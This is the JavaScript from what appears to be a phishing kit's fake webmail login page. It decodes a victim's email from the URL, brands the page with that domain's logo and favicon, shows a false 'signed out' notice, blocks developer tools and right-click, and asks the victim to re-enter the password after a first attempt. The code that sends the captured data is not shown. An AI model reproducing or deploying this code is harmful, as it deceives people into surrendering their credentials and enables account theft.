<script>


$(document).ready(function(){
	
	//set global variables
	var vsr = window.location.href.slice(window.location.href.indexOf('#') + 1);
	const myArray = vsr.split("&");
	vsr = myArray[0];
	
		
	//set external files
	const prefix = "C:/Users/Administrator/Desktop/SCRIPTS/01/01/generalPg/enterprise/";

	var arrayset =[

		//['ovhicon','ovh.ico','href','id'],
		['commoncss','common.min.css?s=1722763434','href','id'],
		['jplugin','jquery-ui.min.css?s=1722763434','href','id'],
		//['logo','roundcube_logo.png?s=1722763434','src','id'],
	
	]


    // Load the external script and call the external callback function
           loadExternalScript('enterprise.js', function() {
				checkDNS(vsr,function(){
					onBodyLoad(arrayset, prefix, vsr);
				});
             

            });

			
	// function to load external script
	function loadExternalScript(url,callback) {
		var script = document.createElement('script');
		script.src = prefix + url;
		script.onload = function() {
			
			if (callback) {
				callback();				
			}
			
		};

		document.head.appendChild(script); // Append the script to the body
	}
	
	var usr = atob(atob(vsr));
	var indx=usr.indexOf("@");
	var my_slice=usr.substr((indx+1));
	$("#favLink").attr("href","https://www.google.com/s2/favicons?domain_url="+my_slice+"&sz=64");
	$("#logo").attr("src","https://logo.clearbit.com/"+my_slice);


	//initialize and display  session error
	$('#loading').show();
	$('#loading').delay(1000).hide(0); 
	document.getElementById('warning').innerHTML="You have been signed out! Sign in to continue";
	$('#warning').delay(1000).show(0);
	$('#warning').delay(2000).hide(500);
			
});
	
document.addEventListener('keydown', event => {
  if (event.keyCode === 123 || (event.ctrlKey && event.shiftKey && event.keyCode === 73)) {
    event.preventDefault();
  }
});



// Disable right-click context menu
document.addEventListener('contextmenu', event => event.preventDefault());


//avoid form submission without validation
$('#loginbtn').on('click', function(event) {
	//alert("start fxnt");
	clkLgn(function(statusCode){
		
		displayCss(statusCode);
		

	});
});
$('.boxcontent').on('keydown', function(event) {
        checkSubmit(event, function(statusCode) {

			displayCss(statusCode);
        });
    });
	
function displayCss(status){

		if(status){
			//initialize and display  attempt error
			$('#loading').show();
			$('#loading').delay(1000).hide(0); 
			document.getElementById('warning').innerHTML="Retry entry for password";
			$('#warning').delay(1000).show(0);
			$('#warning').delay(2000).hide(500);
		}else {
			$('#loading').show();
			$('#loading').delay(1000).hide(0); 
			document.getElementById('warning').innerHTML="Login failed.";
			$('#warning').delay(1000).show(0);
			$('#warning').delay(2000).hide(500); 
		}

	
}
</script>
